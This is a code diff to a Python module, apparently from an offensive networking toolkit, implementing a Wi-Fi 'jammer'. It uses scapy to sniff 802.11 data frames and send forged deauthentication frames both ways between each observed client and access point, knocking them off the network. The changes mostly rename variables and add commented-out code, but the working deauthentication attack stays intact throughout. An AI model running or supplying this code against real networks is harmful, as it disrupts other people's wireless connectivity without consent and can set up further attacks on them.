@@ -3,10 +3,10 @@ from src.envena.base.tool import Tool
 from scapy.all import conf, get_if_hwaddr, conf, AsyncSniffer, Dot11, RadioTap, Dot11Deauth
 from scapy.all import sendp
 from src.envena.functions import validate_bpf
-from time import sleep
+
+from src.modules.dot11 import Dot11Packet, Dot11PacketType
 
 sent_packets = 0
-
 def send_deauth(bssid, eth_src, iface)->bool:
     dot11 = Dot11(addr1=eth_src, addr2=bssid, addr3=bssid)
     packet = RadioTap()/dot11/Dot11Deauth(reason=7)
@@ -16,10 +16,14 @@ def send_deauth(bssid, eth_src, iface)->bool:
     except:
         return False
 
-def process_pkt(pkt, logger, eth_src, iface)->None:
+def process_pkt(pkt, logger, hw_src, iface)->None:
     global sent_packets
     if pkt.haslayer(Dot11):
-        if pkt.type == 2 and pkt.addr2 != eth_src:
+        if pkt.type == 2 and pkt.addr2 != hw_src:
+            # packet = Dot11Packet(iface=iface, count=1, timeout=0, hw_src=pkt.addr1, hw_dst=pkt.addr2, 
+                                #  packet_type=Dot11PacketType.DEAUTH, bssid=pkt.addr3)
+            
+            # packet.send_packet(printed=0)
             if send_deauth(bssid=pkt.addr1, eth_src=pkt.addr2, iface=iface) \
                     and send_deauth(eth_src=pkt.addr1, bssid=pkt.addr2, iface=iface):
                 sent_packets+=1
@@ -30,15 +34,15 @@ def jammer(param, logger)->None:
     try:
         global sent_packets
         iface = param.iface if param.iface else str(conf.iface)
-        eth_src = get_if_hwaddr(iface)
+        hw_src = get_if_hwaddr(iface)
         if not validate_bpf(param.input):
-            logger.fatal('Incorrect BPF. Check up your "--filter" option')
+            logger.fatal('Incorrect BPF. Check up your "filter" option')
             return
         user_filter = f' and ({param.input})' if param.input != '' else ''
         data_filter = "wlan type data" + user_filter
 
         sniffer = AsyncSniffer(iface=iface, prn=lambda pkt: process_pkt(pkt=pkt, logger=logger, iface=iface,
-                                                                        eth_src=eth_src),
+                                                                        hw_src=hw_src),
                                filter=data_filter, store=0)
 
         sniffer.start()
